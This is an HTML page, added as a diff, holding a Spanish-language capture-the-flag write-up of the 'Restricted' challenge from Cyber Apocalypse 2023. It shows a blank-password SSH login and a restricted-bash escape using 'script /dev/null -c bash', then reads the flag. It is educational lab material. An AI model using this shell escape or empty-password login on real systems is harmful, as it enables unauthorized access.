@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup Restricted Cyber Apocalypse 2023</title>
+
+  <meta name="description" content="Resolución del challenge Restricted del Cyber Apocalypse 2023">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup Restricted Cyber Apocalypse 2023">
+  <meta name="twitter:description" content="Resolución del challenge Restricted del Cyber Apocalypse 2023">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/misc.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup Restricted Cyber Apocalypse 2023">
+  <meta property="og:description" content="Resolución del challenge Restricted del Cyber Apocalypse 2023">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/misc.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/misc.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup Restricted Cyber Apocalypse 2023" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/ca2023" title="GatoGamer1155" class="blog-button">Cyber Apocalypse</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+              
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">Cyber Apocalypse 2023</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/misc.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Restricted</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Una vez descomprimido el <code class="language-plaintext highlighter-rouge">zip</code> podemos ver los archivos que nos deja, entre otros podemos ver un archivo <code class="language-plaintext highlighter-rouge">flag.txt</code> que lamentablemente es solo de prueba</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ tree</span><span class="p">
+.
+├── build_docker.sh
+├── Dockerfile
+└── src
+    ├── bash_profile
+    ├── flag.txt
+    └── sshd_config
+
+2 directories, 5 files
+
+</span><span class="ve">❯ cat</span><span class="p"> ./src/flag.txt
+HTB{f4k3_fl4g_f0r_t3st1ng}  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Veamos que mas tenemos, encontramos un <code class="language-plaintext highlighter-rouge">Dockerfile</code>, el cual añade un usuario <code class="language-plaintext highlighter-rouge">restricted</code> deshabilitandole le contraseña, le asigna como shell una <code class="language-plaintext highlighter-rouge">rbash</code> y mueve algunos archivos de configuración como el <code class="language-plaintext highlighter-rouge">sshd_config</code> e inicia el servicio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">Dockerfile
+</span><span class="o">FROM </span><span class="p">debian:</span><span class="na">latest</span><span class="p">
+
+</span><span class="o">RUN </span><span class="p">apt update -y && apt upgrade -y && apt install openssh-server procps -y
+
+</span><span class="o">RUN </span><span class="p">adduser --disabled-password restricted
+</span><span class="o">RUN </span><span class="p">usermod --shell /bin/rbash restricted
+</span><span class="o">RUN </span><span class="p">sed -i -re </span><span class="s">'s/^restricted:[^:]+:/restricted::/'</span><span class="p"> /etc/passwd /etc/shadow
+
+</span><span class="o">RUN </span><span class="p">mkdir /home/restricted/.bin
+</span><span class="o">RUN </span><span class="p">chown -R restricted:restricted /home/restricted
+
+</span><span class="o">RUN </span><span class="p">ln -s /usr/bin/top /home/restricted/.bin
+</span><span class="o">RUN </span><span class="p">ln -s /usr/bin/uptime /home/restricted/.bin
+</span><span class="o">RUN </span><span class="p">ln -s /usr/bin/ssh /home/restricted/.bin
+
+</span><span class="o">COPY </span><span class="p">src/sshd_config /etc/ssh/sshd_config
+</span><span class="o">COPY </span><span class="p">src/flag.txt /flag.txt
+</span><span class="o">COPY </span><span class="p">src/bash_profile /home/restricted/.bash_profile
+
+</span><span class="o">RUN </span><span class="p">chown root:root /home/restricted/.bash_profile
+</span><span class="o">RUN </span><span class="p">chmod 755 /home/restricted/.bash_profile
+</span><span class="o">RUN </span><span class="p">chmod 755 /flag.txt
+
+</span><span class="o">RUN </span><span class="p">mv /flag.txt /flag_`cat /dev/urandom | tr -dc </span><span class="s">'a-zA-Z0-9'</span><span class="p"> | fold -w 5 | head -n 1`  
+
+</span><span class="o">RUN </span><span class="p">ssh-keygen -A
+</span><span class="o">RUN </span><span class="p">mkdir -p /run/sshd
+
+</span><span class="o">EXPOSE </span><span class="p">1337
+
+</span><span class="o">ENTRYPOINT</span><span class="p"> [</span><span class="s">"/usr/sbin/sshd"</span><span class="p">, </span><span class="s">"-D"</span><span class="p">, </span><span class="s">"-o"</span><span class="p">, </span><span class="s">"ListenAddress=0.0.0.0"</span><span class="p">, </span><span class="s">"-p"</span><span class="p">, </span><span class="s">"1337"</span><span class="p">]</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El <code class="language-plaintext highlighter-rouge">build_docker.sh</code> simplemente crea el contenedor con el nombre <code class="language-plaintext highlighter-rouge">misc_bastion</code></code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat</span><span class="p"> build_docker.sh
+</span><span class="c1">#!/bin/bash
+</span><span class="p">
+docker build . -t misc_bastion
+docker run --rm -it --name misc_bastion -p1337:1337 misc_bastion  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">También encontramos un archivo con nombre <code class="language-plaintext highlighter-rouge">bash_profile</code> que simplemente define como path la ruta <code class="language-plaintext highlighter-rouge">~/.bin</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">src/bash_profile  
+PATH=$HOME/.bin</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente tenemos el <code class="language-plaintext highlighter-rouge">sshd_config</code> que si quitamos con <code class="language-plaintext highlighter-rouge">grep -vE</code> todos las lineas que sean un comentario y las que no tengan contenido se puede ver algo asi</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">sshd_config | </span><span class="ve">grep</span><span class="p"> -vE </span><span class="am">'^#|^$' </span><span class="p">
+</span><span class="o">Include </span><span class="s">/etc/ssh/sshd_config.d/</span><span class="o">*</span><span class="s">.conf
+</span><span class="o">ChallengeResponseAuthentication </span><span class="mi">no
+</span><span class="o">UsePAM </span><span class="mi">yes
+</span><span class="o">X11Forwarding </span><span class="mi">yes
+</span><span class="o">PrintMotd </span><span class="mi">no
+</span><span class="o">AcceptEnv </span><span class="s">LANG LC_</span><span class="o">*
+</span><span class="o">Subsystem       </span><span class="s">sftp    /usr/lib/openssh/sftp-server  
+</span><span class="o">Match user </span><span class="s">restricted
+    </span><span class="o">PermitEmptyPasswords </span><span class="mi">yes</span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">Lo destacable en archivo de configuración es que para especificamente el usuario <code class="language-plaintext highlighter-rouge">restricted</code> se permite autenticarse con contraseña en blanco asi que lo hacemos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">restricted@143.110.160.221 -p 32044
+</span><span class="ve">restricted@ng-restricted-ykmdo-669f9c7887-5xtx2</span><span class="p">:</span><span class="az">~</span><span class="p">$ id  
+-rbash: id: command not found
+</span><span class="ve">restricted@ng-restricted-ykmdo-669f9c7887-5xtx2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Estamos en una <code class="language-plaintext highlighter-rouge">restricted bash</code>, para bypassearlo basta con spawnearnos una <code class="language-plaintext highlighter-rouge">bash</code> al conectarnos mediante <code class="language-plaintext highlighter-rouge">ssh</code>, esto nos dara una bash sin ninguna restricción</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">restricted@143.110.160.221 -p 32044 </span><span class="am">"script /dev/null -c bash"</span><span class="p">  
+Script started, output log file is '/dev/null'.
+</span><span class="ve">restricted@ng-restricted-ykmdo-669f9c7887-5xtx2</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1000(restricted) gid=1000(restricted) groups=1000(restricted)
+</span><span class="ve">restricted@ng-restricted-ykmdo-669f9c7887-5xtx2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si vamos al directorio <code class="language-plaintext highlighter-rouge">/</code> podemos ver la <code class="language-plaintext highlighter-rouge">flag</code> y finalmente leerla sin problemas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">restricted@ng-restricted-ykmdo-669f9c7887-5xtx2</span><span class="p">:</span><span class="az">~</span><span class="p">$ cd /
+</span><span class="ve">restricted@ng-restricted-ykmdo-669f9c7887-5xtx2</span><span class="p">:</span><span class="az">/</span><span class="p">$ ls -l
+drwxr-xr-x   1 root root  4096 Mar 16 16:10 bin
+drwxr-xr-x   2 root root  4096 Dec  9 19:15 boot
+drwxr-xr-x   5 root root   360 Mar 18 20:15 dev
+drwxr-xr-x   1 root root  4096 Mar 18 20:15 etc
+-rwxr-xr-x   1 root root    32 Mar 16 16:15 flag_8dpsy
+drwxr-xr-x   1 root root  4096 Mar 16 16:10 home
+drwxr-xr-x   1 root root  4096 Mar 16 16:10 lib
+drwxr-xr-x   2 root root  4096 Feb 27 00:00 lib64
+drwxr-xr-x   2 root root  4096 Feb 27 00:00 media
+-rwxr-xr-x   1 root root 11369 Mar 15 21:39 memories.dump
+drwxr-xr-x   2 root root  4096 Feb 27 00:00 mnt
+drwxr-xr-x   2 root root  4096 Feb 27 00:00 opt
+dr-xr-xr-x 339 root root     0 Mar 18 20:15 proc
+drwx------   2 root root  4096 Feb 27 00:00 root
+drwxr-xr-x   1 root root  4096 Mar 18 20:20 run
+drwxr-xr-x   1 root root  4096 Mar 16 16:10 sbin
+drwxr-xr-x   2 root root  4096 Feb 27 00:00 srv
+dr-xr-xr-x  13 root root     0 Mar 18 20:15 sys
+drwxrwxrwt   1 root root  4096 Mar 16 16:10 tmp
+drwxr-xr-x   1 root root  4096 Feb 27 00:00 usr
+drwxr-xr-x   1 root root  4096 Feb 27 00:00 var
+</span><span class="ve">restricted@ng-restricted-ykmdo-669f9c7887-5xtx2</span><span class="p">:</span><span class="az">/</span><span class="p">$ cat flag_8dpsy  
+HTB{r35tr1ct10n5_4r3_p0w3r1355}
+</span><span class="ve">restricted@ng-restricted-ykmdo-669f9c7887-5xtx2</span><span class="p">:</span><span class="az">/</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
